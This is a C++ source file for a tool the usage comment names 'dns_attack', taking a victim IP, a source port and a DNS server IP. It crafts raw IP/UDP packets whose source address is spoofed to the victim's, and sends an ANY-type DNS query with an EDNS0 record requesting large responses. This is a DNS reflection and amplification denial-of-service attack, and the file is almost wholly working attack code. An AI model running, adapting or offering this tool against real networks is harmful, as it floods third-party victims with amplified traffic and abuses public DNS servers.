#include <iostream>
#include <cstdlib>
#include <cstring>
#include <ctime>

#include <sys/socket.h>
#include <arpa/inet.h>    // inet_addr
#include <netinet/ip.h>   // Provides declarations for ip header
#include <netinet/udp.h>  // Provides declarations for udp header
using namespace std;

#define DEFAULT_QUERY_NAME "google.com"

// Checksum (from internet)
unsigned short checksum(unsigned short *buf, int len){
    unsigned long sum = 0xffff;

    while (len > 1){
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*) buf;

    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

void socket_init(int& sock_r) {
    sock_r = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    if (sock_r < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
    int one = 1;
    if (setsockopt(sock_r, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cout << "Fail to Set IP_HDRINCL\n";
        exit(2);
    } else
        cout << "Success to set IP_HDRINCL\n";
}

struct pshdr {
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
};

struct dnshdr {
    // short -> 2 byte
    unsigned short id;      // ID
    unsigned short flags;   // DNS Flags

    unsigned short qcnt;    // Question Count
    unsigned short acnt;    // Answer Count

    unsigned short auth;    // Authority RR
    unsigned short add;     // Additional RR
};

struct query {
    unsigned short qtype;
    unsigned short qclass;
};

struct adt {
	char name;
	char type_1, type_2;
	char size_1, size_2;
	char rcode;
	char edns0;
	char z_1, z_2;
	char len_1, len_2;
};

void construct_dns_hdr(dnshdr* h) {
    h -> id    = htons(0x7419);
    h -> flags = htons(0x0100);
    h -> qcnt  = htons(0x0001);
    h -> acnt  = htons(0x0000);
    h -> auth  = htons(0x0000);
    h -> add   = htons(0x0001);
}

void construct_dns_query(char *qury, char* host) {
    int poi = 0;
    strcat((char*) host, ".");

    for(int i = 0 ; i < strlen((char*) host); i++) {
        if (host[i] == '.') {
            *qury++ = i - poi;
            for ( ; i > poi; poi++) {
                *qury++ = host[poi];
            }
            poi++;
        }
    }
    *qury++ = 0x00;
}

void construct_add_rec(struct adt *ad) {
    ad -> name    = 0;
    ad -> type_1  = 0;     ad -> type_2 = 41;
    ad -> size_1  = 0xff;  ad -> size_2 = 0xff;
    ad -> rcode   = 0;
    ad -> edns0   = 0;
	ad -> z_1     = 0;     ad -> z_2    = 0;
    ad -> len_1   = 0;     ad -> len_2  = 0;
} 

void construct_ip_hdr(struct iphdr *ip, int tot_len, char* source_ip, sockaddr_in addr) {
    ip -> version  = 4;
    ip -> ihl      = 5;
    ip -> tos      = 0;
    ip -> tot_len  = tot_len;
    ip -> id       = htonl(rand());
    ip -> frag_off = 0;
    ip -> ttl      = 64;
    ip -> protocol = IPPROTO_UDP;
    ip -> check    = 0;
    ip -> saddr    = inet_addr(source_ip);
    ip -> daddr    = addr.sin_addr.s_addr;
}

void construct_udp_hdr(udphdr *u, int udp_len, int source_port) {
    u -> source = htons(source_port);
    u -> dest   = htons(53);
    u -> len    = htons(udp_len);
    u -> check  = 0;
}

/* Command
$ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
*/
int main(int argc, char const *argv[]) {
    srand(time(NULL));


    // ~~~~~~~~~~~~~~ DNS QUERY DATA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

    unsigned char dns_data[128];
    struct dnshdr *dns_hdr = (struct dnshdr*) &dns_data;
    construct_dns_hdr(dns_hdr);

    char *dns_name  = (char*) &dns_data[sizeof(struct dnshdr)];
    char dns_rcrd[32];
    
    strcpy(dns_rcrd, (char*) DEFAULT_QUERY_NAME);
    construct_dns_query(dns_name , dns_rcrd);

    int now_poi = 0;
    query *q;
    now_poi = sizeof(struct dnshdr) + (strlen((const char*) dns_name) + 1);
    q = (query*) &dns_data[now_poi];
    q -> qtype = htons(0x00ff); // any type of query
    q -> qclass = htons(0x1);

	adt *adtp;
    now_poi = now_poi + sizeof(struct query);
	adtp = (adt*) &dns_data[now_poi];
    construct_add_rec(adtp);

    int dns_data_len = 0;
    dns_data_len += sizeof(struct dnshdr) + strlen((const char*) dns_name) + 1;
    dns_data_len += sizeof(struct query) + sizeof(struct adt);

    // ~~~~~~~~~~~~~~ DNS QUERY DATA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //


    // IP setting
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(80);
    addr.sin_addr.s_addr = inet_addr(argv[3]);


    char datagram[4096], source_ip[32], *data, *psgram;

    memset(datagram, 0, 4096);
    strcpy(source_ip, argv[1]);

    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    memcpy(data, &dns_data, dns_data_len);


    struct iphdr  *ip_header  = (struct iphdr* ) (datagram);
    struct udphdr *udp_header = (struct udphdr*) (datagram + sizeof(struct iphdr)); 
    
    int tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_data_len;
	
	// IP header
    construct_ip_hdr(ip_header, tot_len, source_ip, addr);
    ip_header -> check = checksum((unsigned short*) datagram, ip_header -> tot_len);

	// UDP header
    // int udp_len = 8 + dns_data_len;
    int udp_data_len = sizeof(struct udphdr) + dns_data_len;
    construct_udp_hdr(udp_header, udp_data_len, atoi(argv[2]));

    int tmp_len = sizeof(struct udphdr) + dns_data_len;

    struct pshdr ps_hdr;
    ps_hdr.saddr = inet_addr(argv[1]);
    ps_hdr.daddr = addr.sin_addr.s_addr;
    ps_hdr.filler = 0;
    ps_hdr.protocol = IPPROTO_UDP;
    ps_hdr.len = htons(tmp_len);

    int siz = sizeof(struct pshdr) + udp_data_len;
    psgram = (char*) malloc(siz);

    memcpy(psgram, (char*) &ps_hdr, sizeof(struct pshdr));
    memcpy(psgram + sizeof(struct pshdr), udp_header, tmp_len);
    
	// UDP checksum
    udp_header -> check = checksum((unsigned short*) psgram, siz);


    int sock_r;
    socket_init(sock_r);

    int send_time = 3;
	while (send_time--) {
		sendto(sock_r, datagram, ip_header -> tot_len, 0, (struct sockaddr*) &addr, sizeof(addr));
		
		cout << "Send packet successfully!\n";
	}
    return 0;
}